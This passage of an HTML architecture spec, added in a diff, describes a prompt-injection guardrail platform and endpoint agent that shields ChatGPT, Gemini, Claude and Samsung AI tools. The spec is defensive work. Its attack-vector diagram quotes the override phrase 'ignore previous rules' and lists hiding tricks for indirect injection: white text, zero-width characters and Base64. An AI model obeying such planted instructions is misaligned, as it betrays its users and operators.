@@ -1,0 +1,834 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Enterprise AI Security Guardrail</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<meta name="description" content="Architecture specification of the AI-EDR inline guardrail platform and the CheckPoint Zero endpoint agent, as built on 2 Nov 2026.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Archivo:wdth,wght@75..125,500..800&family=JetBrains+Mono:wght@400;600&family=Source+Sans+3:ital,wght@0,400;0,600;0,700;1,400&display=swap">
+<style>
+/* Layout: a spec sheet. Sticky section index on the left at desktop width, one reading column on the right;
+   tables, code and the flow diagram scroll inside their own boxes, never the page. */
+:root {
+  --bg: #F4F6FA;
+  --surface: #FFFFFF;
+  --ink: #0E1A33;
+  --muted: #55627A;
+  --line: #D9E0EB;
+  --accent: #1C56D4;
+  --accent-soft: #E7EEFC;
+  --ok: #12784A;  --ok-soft: #E2F3E9;
+  --warn: #9C5600; --warn-soft: #FBEFDD;
+  --bad: #BD2D26;  --bad-soft: #FBE6E4;
+  --code-bg: #0E1A31; --code-fg: #DCE5F7; --code-key: #91B6FF; --code-str: #A4E3BC; --code-lit: #F6C27E; --code-dim: #8494B2;
+  --shadow: 0 1px 2px rgb(14 26 51 / 6%), 0 6px 18px rgb(14 26 51 / 6%);
+  --font-display: "Archivo", "Helvetica Neue", Arial, sans-serif;
+  --font-body: "Source Sans 3", -apple-system, "Segoe UI", system-ui, sans-serif;
+  --font-mono: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  color-scheme: light;
+  padding-top: env(safe-area-inset-top, 0px);
+  padding-bottom: env(safe-area-inset-bottom, 0px);
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg: #0A1222; --surface: #101B31; --ink: #E5EBF6; --muted: #98A6C0; --line: #233253;
+    --accent: #7AA8FF; --accent-soft: #16274B;
+    --ok: #4CCB8E; --ok-soft: #0F2E22; --warn: #F2AB4E; --warn-soft: #33240E; --bad: #FF7B71; --bad-soft: #3A1714;
+    --code-bg: #060D1B; --code-fg: #D8E2F6; --code-key: #8DB3FF; --code-str: #9BDDB4; --code-lit: #F3BE78; --code-dim: #72819F;
+    --shadow: 0 1px 2px rgb(0 0 0 / 30%), 0 6px 20px rgb(0 0 0 / 25%);
+    color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --bg: #0A1222; --surface: #101B31; --ink: #E5EBF6; --muted: #98A6C0; --line: #233253;
+  --accent: #7AA8FF; --accent-soft: #16274B;
+  --ok: #4CCB8E; --ok-soft: #0F2E22; --warn: #F2AB4E; --warn-soft: #33240E; --bad: #FF7B71; --bad-soft: #3A1714;
+  --code-bg: #060D1B; --code-fg: #D8E2F6; --code-key: #8DB3FF; --code-str: #9BDDB4; --code-lit: #F3BE78; --code-dim: #72819F;
+  --shadow: 0 1px 2px rgb(0 0 0 / 30%), 0 6px 20px rgb(0 0 0 / 25%);
+  color-scheme: dark;
+}
+
+*, *::before, *::after { box-sizing: border-box; }
+html { -webkit-text-size-adjust: 100%; }
+@media (prefers-reduced-motion: no-preference) { html { scroll-behavior: smooth; } }
+body { margin: 0; background: var(--bg); color: var(--ink); font: 400 1.0625rem/1.62 var(--font-body); }
+img { max-width: 100%; }
+[hidden] { display: none !important; }
+a { color: var(--accent); text-underline-offset: 3px; }
+a:focus-visible, button:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; border-radius: 4px; }
+p, li { max-width: 70ch; }
+strong { font-weight: 700; }
+
+.wrap {
+  max-width: 1240px; margin: 0 auto;
+  padding-left: max(16px, env(safe-area-inset-left, 0px));
+  padding-right: max(16px, env(safe-area-inset-right, 0px));
+}
+
+/* ---------- masthead ---------- */
+.masthead { background: var(--surface); border-bottom: 1px solid var(--line); }
+.masthead .wrap { padding-block: clamp(28px, 5vw, 60px) clamp(24px, 4vw, 44px); display: grid; gap: 18px; }
+.kicker { display: flex; flex-wrap: wrap; gap: 6px 18px; font: 600 .74rem/1.3 var(--font-mono); letter-spacing: .08em; text-transform: uppercase; color: var(--muted); }
+h1 {
+  font-family: var(--font-display); font-stretch: 112%; font-weight: 800;
+  font-size: clamp(2.1rem, 1.3rem + 3.4vw, 3.4rem); line-height: 1.02; letter-spacing: -.012em;
+  margin: 0; max-width: 18ch; text-wrap: balance;
+}
+.lede { margin: 0; font-size: clamp(1.1rem, 1rem + .4vw, 1.3rem); line-height: 1.5; color: var(--muted); max-width: 60ch; }
+.meta { display: flex; flex-wrap: wrap; align-items: center; gap: 10px 14px; font-size: .95rem; color: var(--muted); }
+.targets { display: flex; flex-wrap: wrap; gap: 8px; margin: 0; padding: 0; list-style: none; }
+.targets li { font: 600 .8rem/1 var(--font-body); padding: 7px 11px; border: 1px solid var(--line); border-radius: 999px; background: var(--bg); color: var(--ink); }
+.targets li.sam { border-color: var(--accent); color: var(--accent); background: var(--accent-soft); }
+
+/* ---------- page grid ---------- */
+.layout { display: grid; gap: 32px; padding-block: 32px 80px; }
+@media (min-width: 1080px) { .layout { grid-template-columns: 210px minmax(0, 1fr); gap: 56px; } }
+main { min-width: 0; max-width: 900px; }
+
+.toc { font-size: .95rem; }
+.toc-title { font: 600 .72rem/1 var(--font-mono); letter-spacing: .1em; text-transform: uppercase; color: var(--muted); margin: 0 0 10px; }
+.toc ol { list-style: none; margin: 0; padding: 0; display: grid; gap: 2px; }
+.toc a { display: grid; grid-template-columns: 2.4em 1fr; gap: 6px; padding: 6px 10px; border-radius: 8px; color: var(--ink); text-decoration: none; }
+.toc a span { font: 600 .78rem/1.6 var(--font-mono); color: var(--muted); }
+.toc a:hover { background: var(--surface); }
+.toc a[aria-current="true"] { background: var(--accent-soft); color: var(--accent); }
+.toc a[aria-current="true"] span { color: var(--accent); }
+@media (min-width: 1080px) {
+  .toc { position: sticky; top: calc(env(safe-area-inset-top, 0px) + 24px); align-self: start; max-height: calc(100vh - 48px); overflow: auto; }
+}
+@media (max-width: 1079px) {
+  .toc ol { grid-template-columns: repeat(auto-fill, minmax(min(100%, 230px), 1fr)); }
+}
+
+/* ---------- sections & type ---------- */
+section { border-top: 1px solid var(--line); padding-block: 26px 30px; scroll-margin-top: 16px; }
+section:first-child { border-top: 0; padding-top: 0; }
+h2 {
+  font-family: var(--font-display); font-stretch: 108%; font-weight: 750;
+  font-size: clamp(1.45rem, 1.2rem + 1vw, 1.85rem); line-height: 1.15; margin: 0 0 14px; text-wrap: balance;
+  display: flex; gap: .55em; align-items: baseline;
+}
+h2 .num { font: 600 .9rem/1 var(--font-mono); color: var(--accent); letter-spacing: .02em; flex: none; }
+h3 { font-family: var(--font-display); font-weight: 700; font-size: 1.15rem; line-height: 1.3; margin: 26px 0 8px; text-wrap: balance; }
+h4 { font-weight: 700; font-size: 1rem; margin: 18px 0 6px; }
+.eyebrow { font: 600 .72rem/1.2 var(--font-mono); letter-spacing: .09em; text-transform: uppercase; color: var(--muted); margin: 0 0 6px; }
+p { margin: 10px 0; }
+ul, ol { padding-left: 1.25em; margin: 10px 0; }
+li { margin: 5px 0; }
+li::marker { color: var(--muted); }
+
+code { font-family: var(--font-mono); font-size: .86em; background: var(--accent-soft); color: var(--ink); padding: .08em .36em; border-radius: 5px; overflow-wrap: anywhere; }
+pre { margin: 0; background: var(--code-bg); color: var(--code-fg); padding: 16px 18px; overflow-x: auto; font: 400 .82rem/1.62 var(--font-mono); tab-size: 2; }
+pre code { background: none; color: inherit; padding: 0; font-size: inherit; overflow-wrap: normal; }
+.k { color: var(--code-key); } .s { color: var(--code-str); } .l { color: var(--code-lit); } .c { color: var(--code-dim); }
+.codebox { margin: 16px 0; border-radius: 12px; overflow: hidden; border: 1px solid var(--line); background: var(--code-bg); }
+.code-head { display: flex; justify-content: space-between; align-items: center; gap: 12px; padding: 8px 10px 8px 16px; background: var(--code-bg); border-bottom: 1px solid rgb(255 255 255 / 8%); color: var(--code-dim); font: 600 .74rem/1.3 var(--font-mono); }
+.copy { font: 600 .74rem/1 var(--font-mono); color: var(--code-fg); background: transparent; border: 1px solid var(--code-dim); border-radius: 6px; padding: 6px 10px; cursor: pointer; }
+.copy:hover { border-color: var(--code-fg); }
+
+/* "As built" notes: tinted panel with a label, no edge stripe */
+.built { background: var(--accent-soft); border-radius: 12px; padding: 12px 16px; margin: 14px 0; }
+.built .tag { display: block; font: 600 .68rem/1 var(--font-mono); letter-spacing: .11em; text-transform: uppercase; color: var(--accent); margin-bottom: 7px; }
+.built p, .built ul { margin: 4px 0; }
+.built ul { padding-left: 1.1em; }
+
+/* chips: verdicts and status */
+.chip { display: inline-flex; align-items: center; gap: 6px; font: 600 .72rem/1 var(--font-mono); letter-spacing: .03em; padding: 5px 9px; border-radius: 999px; white-space: nowrap; vertical-align: .08em; }
+.chip::before { content: ""; width: 7px; height: 7px; border-radius: 50%; background: currentColor; flex: none; }
+.chip.ok { color: var(--ok); background: var(--ok-soft); }
+.chip.warn { color: var(--warn); background: var(--warn-soft); }
+.chip.bad { color: var(--bad); background: var(--bad-soft); }
+.chip.info { color: var(--accent); background: var(--accent-soft); }
+.chip.neutral { color: var(--muted); background: var(--bg); box-shadow: inset 0 0 0 1px var(--line); }
+
+/* tables */
+.table-wrap { overflow-x: auto; margin: 16px 0; border: 1px solid var(--line); border-radius: 12px; background: var(--surface); }
+table { border-collapse: collapse; width: 100%; font-size: .95rem; line-height: 1.5; }
+th, td { text-align: left; vertical-align: top; padding: 11px 14px; border-bottom: 1px solid var(--line); }
+th { font: 600 .7rem/1.3 var(--font-mono); letter-spacing: .07em; text-transform: uppercase; color: var(--muted); background: var(--bg); white-space: nowrap; }
+tbody tr:last-child td { border-bottom: 0; }
+td.key { font-weight: 700; white-space: nowrap; }
+td code { overflow-wrap: break-word; }   /* keep identifiers whole; a tight table scrolls in its own box */
+td ul { margin: 2px 0; padding-left: 1.05em; }
+td li { margin: 2px 0; }
+.wide-table table { min-width: 680px; }
+
+/* constraints */
+.grid2 { display: grid; gap: 12px; grid-template-columns: repeat(auto-fit, minmax(min(100%, 300px), 1fr)); margin: 14px 0; }
+.card { background: var(--surface); border: 1px solid var(--line); border-radius: 12px; padding: 16px 18px; min-width: 0; }
+.card h4 { margin: 4px 0 6px; font-size: 1.02rem; }
+.card p { margin: 0; color: var(--muted); }
+.card .eyebrow { margin: 0; }
+.card.added { background: var(--accent-soft); border-color: transparent; }
+.card.added .eyebrow { color: var(--accent); }
+
+/* ---------- flow diagram (stage order: 1 inputs, 2 threat data, 3 guard, 4 outcomes) ---------- */
+.flow {
+  display: grid; gap: 10px; margin: 18px 0; padding: 18px; border-radius: 16px;
+  background: var(--surface); border: 1px solid var(--line); box-shadow: var(--shadow);
+  grid-template-columns: minmax(0, 1fr) 30px minmax(0, 1.2fr) 30px minmax(0, 1fr);
+  grid-template-areas:
+    ".  .  db    .  ."
+    ".  .  a0    .  ."
+    "in a1 guard a2 out";
+}
+.node { border-radius: 12px; padding: 14px 15px; border: 1px solid var(--line); background: var(--bg); min-width: 0; }
+.node .eyebrow { margin-bottom: 4px; font-size: .68rem; line-height: 1.3; }
+.node h4 { margin: 0 0 6px; font-family: var(--font-display); font-weight: 700; font-size: 1.02rem; }
+.node p, .node li { font-size: .9rem; line-height: 1.45; color: var(--muted); }
+.node p { margin: 4px 0; }
+.node ul, .node ol { margin: 4px 0 0; padding-left: 1.15em; }
+.node li { margin: 3px 0; }
+.node .sub { color: var(--ink); font-weight: 600; }
+.n-in { grid-area: in; }
+.n-db { grid-area: db; }
+.n-guard { grid-area: guard; background: var(--accent-soft); border-color: transparent; }
+.n-guard .eyebrow, .n-guard h4 { color: var(--accent); }
+.n-guard li { color: var(--ink); }
+.outs { grid-area: out; display: grid; gap: 10px; align-content: start; min-width: 0; }
+.n-ok { background: var(--ok-soft); border-color: transparent; }
+.n-bad { background: var(--bad-soft); border-color: transparent; }
+.n-ok .vt { color: var(--ok); } .n-bad .vt { color: var(--bad); }
+.vt { font: 700 .74rem/1 var(--font-mono); letter-spacing: .06em; display: block; margin-bottom: 6px; }
+.arrow { display: grid; place-items: center; color: var(--muted); }
+.arrow svg { width: 26px; height: 26px; }
+.a0 { grid-area: a0; } .a1 { grid-area: a1; } .a2 { grid-area: a2; }
+.a0 small { font: 600 .68rem/1.2 var(--font-mono); letter-spacing: .06em; text-transform: uppercase; }
+.a0 { grid-auto-flow: column; gap: 8px; }
+@media (max-width: 820px) {
+  .flow {
+    grid-template-columns: minmax(0, 1fr);
+    grid-template-areas: "in" "a1" "db" "a0" "guard" "a2" "out";
+  }
+  .a1 svg, .a2 svg { transform: rotate(90deg); }
+}
+
+/* sequences that really are ordered */
+.steps { list-style: none; padding: 0; margin: 16px 0; display: grid; gap: 10px; counter-reset: step; }
+.steps > li { counter-increment: step; display: grid; grid-template-columns: 2.1rem minmax(0, 1fr); gap: 12px; align-items: start; max-width: none; margin: 0; }
+.steps > li::before { content: counter(step); display: grid; place-items: center; width: 2.1rem; height: 2.1rem; border-radius: 50%; background: var(--accent-soft); color: var(--accent); font: 700 .9rem/1 var(--font-mono); }
+.steps > li > div { min-width: 0; padding-top: 4px; }
+.steps h4 { margin: 0 0 4px; }
+.steps p { margin: 0 0 4px; }
+.pipeline { display: grid; gap: 8px; grid-template-columns: repeat(5, minmax(0, 1fr)); list-style: none; padding: 0; margin: 16px 0; counter-reset: p; }
+.pipeline li { counter-increment: p; margin: 0; background: var(--surface); border: 1px solid var(--line); border-radius: 12px; padding: 12px 13px; font-size: .9rem; line-height: 1.45; color: var(--muted); max-width: none; }
+.pipeline li::before { content: "Step " counter(p); display: block; font: 600 .66rem/1 var(--font-mono); letter-spacing: .1em; text-transform: uppercase; color: var(--accent); margin-bottom: 6px; }
+.pipeline b { display: block; color: var(--ink); font-size: .98rem; margin-bottom: 3px; }
+@media (max-width: 820px) { .pipeline { grid-template-columns: minmax(0, 1fr); } }
+
+/* paths A and B */
+.paths { display: grid; gap: 12px; grid-template-columns: repeat(auto-fit, minmax(min(100%, 300px), 1fr)); margin: 14px 0; }
+.path { border-radius: 12px; padding: 14px 16px; }
+.path.a { background: var(--bad-soft); }
+.path.b { background: var(--ok-soft); }
+.path h4 { margin: 0 0 6px; }
+.path.a h4 { color: var(--bad); } .path.b h4 { color: var(--ok); }
+.path ul { margin: 0; padding-left: 1.1em; }
+
+/* formula */
+.formula { margin: 14px 0; padding: 16px; border-radius: 12px; background: var(--surface); border: 1px solid var(--line); overflow-x: auto; text-align: center; }
+.formula math { font-size: 1.15rem; }
+.formula p { margin: 8px auto 0; font-size: .92rem; color: var(--muted); max-width: none; }
+
+/* results */
+.stats { display: grid; gap: 12px; grid-template-columns: repeat(2, minmax(0, 1fr)); margin: 16px 0; }
+@media (min-width: 640px) { .stats { grid-template-columns: repeat(3, minmax(0, 1fr)); } }
+.stat { background: var(--surface); border: 1px solid var(--line); border-radius: 12px; padding: 16px; min-width: 0; }
+.stat b { display: block; font: 800 clamp(1.7rem, 1.3rem + 1.4vw, 2.3rem)/1 var(--font-display); font-stretch: 104%; font-variant-numeric: tabular-nums; color: var(--accent); }
+.stat b.ok { color: var(--ok); } .stat b.warn { color: var(--warn); }
+.stat span { display: block; font-weight: 700; margin-top: 8px; line-height: 1.3; }
+.stat small { display: block; color: var(--muted); font-size: .85rem; margin-top: 3px; line-height: 1.35; }
+
+.prompts { list-style: none; padding: 0; margin: 14px 0; display: grid; gap: 10px; counter-reset: pr; }
+.prompts li { counter-increment: pr; margin: 0; max-width: none; padding: 12px 16px; border-radius: 12px; border: 1px dashed var(--line); background: var(--surface); }
+.prompts li > b { display: block; font-size: .95rem; margin-bottom: 4px; }
+.prompts li > b::before { content: "Prompt " counter(pr) " · "; color: var(--accent); font-family: var(--font-mono); font-size: .82rem; }
+.prompts q { display: block; font-style: italic; color: var(--muted); quotes: "\201C" "\201D"; }
+
+footer.wrap { padding-block: 0 48px; color: var(--muted); font-size: .88rem; }
+</style>
+</head>
+<body>
+
+<header class="masthead">
+  <div class="wrap">
+    <div class="kicker"><span>Architecture specification</span><span>AI-EDR · CheckPoint Zero</span><span>Samsung Digithon 2026</span></div>
+    <h1>Enterprise AI Security Guardrail</h1>
+    <p class="lede">A universal pre-LLM hook and AI-EDR inline guardrail that inspects every AI request before the model reads a single token, plus an endpoint agent that checks what AI agents do on each machine.</p>
+    <div class="meta">
+      <span class="chip ok">Built</span>
+      <span>Status as of 2 Nov 2026. First written 27 Oct 2026 as the build brief for Gemini in Antigravity IDE; <strong>As built</strong> notes mark where the build differs from that plan.</span>
+    </div>
+    <ul class="targets" aria-label="Target platforms">
+      <li>ChatGPT</li><li>Gemini</li><li>Claude</li><li>Claude Code</li><li>Gemini CLI</li><li>Antigravity IDE</li><li>MCP agents</li>
+      <li class="sam">Samsung FabriX</li><li class="sam">Samsung AI Pro</li>
+    </ul>
+  </div>
+</header>
+
+<div class="wrap layout">
+  <nav class="toc" aria-label="Sections">
+    <p class="toc-title">Contents</p>
+    <ol>
+      <li><a href="#constraints"><span>—</span>Constraints</a></li>
+      <li><a href="#architecture"><span>§1</span>Reference architecture</a></li>
+      <li><a href="#falcon"><span>§2</span>The Falcon technique</a></li>
+      <li><a href="#integration"><span>§3</span>Integration layer</a></li>
+      <li><a href="#stages"><span>§4</span>The four stages</a></li>
+      <li><a href="#repository"><span>§5</span>Repository</a></li>
+      <li><a href="#prompts"><span>§6</span>Build prompts</a></li>
+      <li><a href="#endpoint"><span>§7</span>Endpoint agent</a></li>
+      <li><a href="#control-plane"><span>§8</span>Control plane</a></li>
+      <li><a href="#results"><span>§9</span>Results</a></li>
+      <li><a href="#limits"><span>§10</span>Known limits</a></li>
+    </ol>
+  </nav>
+
+  <main>
+    <!-- Constraints -->
+    <section id="constraints">
+      <h2>Architectural constraints</h2>
+      <p>These held for the whole build. Deeper detail lives in <code>architecture.md</code> (§17 for the gateway as built, §19–20 for the endpoint agent and kernel), <code>docs/FLEET_PLATFORM.md</code> and <code>docs/BENCHMARK.md</code>.</p>
+      <div class="grid2">
+        <div class="card"><p class="eyebrow">Constraint 1</p><h4>Not a CLI-only script</h4><p>An enterprise-grade AI-EDR (AI Endpoint Detection &amp; Response) inline guardrail platform, not a narrow local hook.</p></div>
+        <div class="card"><p class="eyebrow">Constraint 2</p><h4>Universal target ecosystem</h4><p>Commercial LLMs (ChatGPT, Gemini, Claude); AI coding IDEs and agents (Claude Code, Gemini CLI, Antigravity IDE, Claude IDE extensions, coding and MCP agents); Samsung FabriX and Samsung AI Pro (<code>aipro</code>).</p></div>
+        <div class="card"><p class="eyebrow">Constraint 3</p><h4>The 4-stage flow with the Falcon technique</h4><p>Attack vector ingestion → AI Risk Database → AI-EDR Security Guard with Falcon → clean safe input to the AI Brain, or the Quarantine Vault.</p></div>
+        <div class="card added"><p class="eyebrow">Constraint 4 · added 31 Oct 2026</p><h4>Guard the machine, not only the request</h4><p>An endpoint agent, CheckPoint Zero (<code>checkpointd</code>), checks what AI agents do on each laptop or server, with kernel checkpoints where the OS allows (§7).</p></div>
+      </div>
+    </section>
+
+    <!-- §1 -->
+    <section id="architecture">
+      <h2><span class="num">§1</span>Reference architecture: the AI-EDR inline model</h2>
+      <p>The platform applies the AI-EDR (Artificial Intelligence Endpoint Detection &amp; Response) paradigm to stop both direct and indirect prompt injection before the target LLM, "the AI Brain", processes a token.</p>
+
+      <div class="flow" role="group" aria-label="AI-EDR inline flow: attack vectors and the AI Risk Database feed the Security Guard, which either passes clean input to the AI Brain or traps the payload in the Quarantine Vault">
+        <div class="node n-db">
+          <p class="eyebrow">Stage 2 · Threat data</p>
+          <h4>AI Risk Database</h4>
+          <ul>
+            <li>Known jailbreak signatures and hashes</li>
+            <li>Vector embeddings of attack prompts</li>
+            <li>Falcon threat intel and IOC feeds</li>
+          </ul>
+        </div>
+        <div class="arrow a0" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 4v14M7 13l5 5 5-5"/></svg>
+          <small>Lookup + sync</small>
+        </div>
+        <div class="node n-in">
+          <p class="eyebrow">Stage 1 · Attack vectors</p>
+          <h4>Direct and indirect</h4>
+          <p><span class="sub">A. Direct:</span> the active user types “ignore previous rules and do X”.</p>
+          <p><span class="sub">B. Indirect:</span> poisoned PDFs, résumés, docs, RAG chunks and web scrapes, e.g. hidden white text saying “ignore…”.</p>
+        </div>
+        <div class="arrow a1" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12h14M13 7l5 5-5 5"/></svg>
+        </div>
+        <div class="node n-guard">
+          <p class="eyebrow">Stage 3 · Security Guard</p>
+          <h4>Inline pre-LLM guardrail + Falcon engine</h4>
+          <ol>
+            <li>Checks for hidden tricks: steganography, invisible text, Base64/hex, PDF metadata</li>
+            <li>Strips out bad commands: surgical sanitization (CDR)</li>
+            <li>Validates against the AI Risk Database</li>
+            <li>Executes the Falcon technique</li>
+          </ol>
+        </div>
+        <div class="arrow a2" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12h14M13 7l5 5-5 5"/></svg>
+        </div>
+        <div class="outs">
+          <div class="node n-ok">
+            <span class="vt">ALLOWED · clean safe input</span>
+            <h4>Stage 4 · The AI Brain</h4>
+            <p>ChatGPT · Gemini · Claude · FabriX · AI Pro receive sanitized, verified context. Safety rules stay intact and the answer is helpful and safe.</p>
+          </div>
+          <div class="node n-bad">
+            <span class="vt">BLOCKED · malicious input</span>
+            <h4>Trap &amp; Quarantine Vault</h4>
+            <p>Payload isolated with 0 LLM tokens spent, forensic snapshot logged, SIEM / SOC alert emitted. The Falcon Loop updates the AI Risk Database.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="built"><span class="tag">As built</span>
+        <p>The same four stages run in three places:</p>
+        <ul>
+          <li><strong>The gateway:</strong> the reverse proxy and the hook API.</li>
+          <li><strong>Its clients:</strong> IDE hooks, the browser extension, and the SDK and Samsung examples.</li>
+          <li><strong>The endpoint agent:</strong> it embeds the same engine on each machine (§7).</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- §2 -->
+    <section id="falcon">
+      <h2><span class="num">§2</span>The Falcon technique</h2>
+      <p>The Falcon technique is a core pillar of the guardrail, implemented in two complementary layers.</p>
+
+      <h3>Layer A · Falcon-style lightweight sensor and behavioral runtime interception</h3>
+      <p>Inspired by the CrowdStrike Falcon EDR architecture, the guardrail uses a dual sensor and cloud threat graph model instead of brittle static regexes or heavy external proxies.</p>
+      <div class="grid2">
+        <div class="card">
+          <h4>Lightweight inline sensor hook</h4>
+          <p>Sits at the LLM API (proxy), the IDE hook (prompt submit, before and after each tool call), the browser and the MCP tool boundary. It observes user prompts and agentic process trees: prompt → RAG retrieval → tool selection → sub-agent spawn.</p>
+        </div>
+        <div class="card">
+          <h4>Behavioral IOAs over static IOCs</h4>
+          <p>Even a zero-day paraphrase that no regex knows is caught by intent: instruction-override semantics, role-play framing, privilege escalation, or an abnormal file-to-prompt transition.</p>
+        </div>
+      </div>
+      <div class="built"><span class="tag">As built · sensor</span>
+        <ul>
+          <li>Added latency is p50 17 ms and p95 60 ms per prompt on a laptop CPU, mostly from Tier 2.</li>
+          <li>The endpoint agent adds a sensor on the machine itself. On Linux that sensor is a real eBPF kernel program (§7).</li>
+        </ul>
+      </div>
+      <div class="card">
+        <h4>The Falcon Loop: real-time threat graph feedback</h4>
+        <p>Whenever a malicious prompt or poisoned PDF is trapped, its semantic embedding and structural signature are pushed back into the AI Risk Database, immunizing ChatGPT, Gemini, Claude, Samsung FabriX and AI Pro across the organization.</p>
+      </div>
+      <div class="built"><span class="tag">As built · Falcon Loop</span>
+        <ul>
+          <li>The gateway learns in-process at once: the offending text and each instruction sentence become signatures and vectors, and the trie is rebuilt in under 1 ms.</li>
+          <li>Segments with DLP findings (secrets, PII, proprietary markers) are never promoted.</li>
+          <li>Learned entries also go to the persistent AI Risk DB in the control plane, and reach endpoints only through gated, signed releases (§8).</li>
+        </ul>
+      </div>
+
+      <h3>Layer B · FALCON fast-adaptive local classification and sanitization</h3>
+      <p>To stay inline-fast without asking a large, expensive LLM to guard another LLM, the Falcon engine runs a three-step micro-pipeline:</p>
+      <ol class="steps">
+        <li><div><h4>De-obfuscation and hidden-trick unpacking</h4><p>Extracts text from PDFs, DOCX and source code, and flags any mismatch between what is rendered and what is parsed: white-on-white text, zero-width Unicode, font size 0, PDF metadata or annotation injections, Base64/ROT13 payloads.</p></div></li>
+        <li><div><h4>Surgical command stripping (CDR)</h4><p>In Strip/Sanitize mode, an injected command inside a legitimate document is neutralized while the clean data is kept, so the workflow does not break. High-severity threats go to hard quarantine.</p></div></li>
+        <li><div><h4>Fast local sequence classification</h4><p>A local model next to a fast vector similarity lookup against the AI Risk Database.</p>
+          <div class="built"><span class="tag">As built · model</span>
+            <ul>
+              <li><strong>Model:</strong> <code>protectai/deberta-v3-base-prompt-injection-v2</code> on ONNX Runtime (Apache-2.0, ~740 MB, fetched by <code>scripts/download_model.sh</code>), cascaded behind a local hashed n-gram model.</li>
+              <li><strong>Short texts</strong> are scored whole.</li>
+              <li><strong>Long texts:</strong> the local model picks the 16 most suspicious windows and DeBERTa scores them in one batch. DeBERTa never scores raw code.</li>
+              <li><strong>Korean and fragments under 5 words</strong> use the local model, because DeBERTa is English-only.</li>
+              <li><strong>Corroboration cap:</strong> in untrusted content, a classifier-only signal with no IOA, signature, vector or hidden-layer corroboration is capped at LOW. Without the cap, 70% of real source files were flagged.</li>
+            </ul>
+          </div>
+        </div></li>
+      </ol>
+    </section>
+
+    <!-- §3 -->
+    <section id="integration">
+      <h2><span class="num">§3</span>Multi-platform integration layer</h2>
+      <p>The original plan had two integration modes. Five were built.</p>
+      <div class="table-wrap wide-table">
+        <table>
+          <thead><tr><th>Mode</th><th>How</th><th>Where</th></tr></thead>
+          <tbody>
+            <tr><td class="key">1 · Reverse proxy</td><td>Drop-in <code>base_url</code> / <code>ANTHROPIC_BASE_URL</code> swap for the OpenAI, Gemini and Anthropic SDKs, Claude Code, Antigravity IDE, FabriX and AI Pro</td><td><code>src/main.py</code>, <code>src/proxy_router/</code></td></tr>
+            <tr><td class="key">2 · Hook API</td><td><code>POST /v1/ai-edr/inspect</code> (also <code>/inspect/simple</code>, <code>/scan-file</code>), called out of band before any model request</td><td><code>hook_webhook_controller.py</code></td></tr>
+            <tr><td class="key">3 · IDE hooks</td><td>Claude Code (<code>UserPromptSubmit</code>, <code>PreToolUse</code>, <code>PostToolUse</code>) and Gemini CLI (<code>BeforeAgent</code>, <code>BeforeTool</code>, <code>AfterTool</code>). Files are scanned before the model reads them; the model gets the sanitized content</td><td><code>integrations/claude_code/</code>, <code>integrations/gemini_cli/</code></td></tr>
+            <tr><td class="key">4 · Browser extension</td><td>Chrome MV3 for claude.ai and gemini.google.com. Holds Send, the file picker, drag &amp; drop and paste until the gateway answers, and swaps a poisoned file for a sanitized copy</td><td><code>integrations/browser_extension/</code></td></tr>
+            <tr><td class="key">5 · Endpoint agent</td><td><code>checkpointd</code> on each machine, with the engine embedded (§7)</td><td><code>agent/</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p><strong>Samsung examples:</strong> <code>fabrix_workflow_guard.py</code> is a guard node between RAG retrieval and the LLM node; <code>aipro_presend_hook.py</code> is a pre-send IDE hook with injection and IP/secret DLP (exit 0 when safe, 2 when blocked); <code>ai_edr_client.py</code> is a dependency-free client. All three are in <code>integrations/samsung/</code>, and SDK examples for OpenAI, Gemini and Anthropic are in <code>integrations/sdk_examples/</code>.</p>
+
+      <h3>3.1 Target platform protocol adapters</h3>
+      <p>Built as specified in <code>src/adapters/</code>. Each adapter also writes sanitized content back in the provider's own format.</p>
+      <div class="table-wrap wide-table">
+        <table>
+          <thead><tr><th>Adapter</th><th>Endpoints</th><th>Inspects</th></tr></thead>
+          <tbody>
+            <tr><td class="key">OpenAI / ChatGPT</td><td><code>/v1/chat/completions</code>, <code>/v1/responses</code></td><td><code>messages</code>, <code>tools</code>, file and image attachments</td></tr>
+            <tr><td class="key">Google Gemini</td><td><code>/v1beta/models/{model}:generateContent</code>, also <code>/v1/models/…</code></td><td><code>contents[].parts[]</code>, <code>inlineData</code> (PDF and document blobs), <code>systemInstruction</code>, <code>functionCall</code></td></tr>
+            <tr><td class="key">Anthropic Claude &amp; IDEs</td><td><code>/v1/messages</code>, <code>/v1/messages/count_tokens</code></td><td><code>system</code>, <code>messages[]</code>, document blocks, MCP <code>tool_use</code> / <code>tool_result</code> blocks</td></tr>
+            <tr><td class="key">Samsung FabriX</td><td><code>/v1/fabrix/*</code></td><td>Multi-agent orchestration payloads, RAG knowledge-base chunks retrieved by FabriX, prompt templates. Preserves <code>X-FabriX-Tenant-Id</code>, <code>X-FabriX-Trace-Id</code> and Bearer SSO tokens</td></tr>
+            <tr><td class="key">Samsung AI Pro</td><td><code>/v1/aipro/*</code></td><td>Developer prompts, IDE workspace context files, code diffs and proprietary source markers, against both injection and IP leakage</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="built"><span class="tag">As built</span><p>The FabriX and AI Pro request formats are assumptions until Samsung provides the official schemas. Their field maps are configurable.</p></div>
+
+      <h3>3.2 Unified canonical inspection schema</h3>
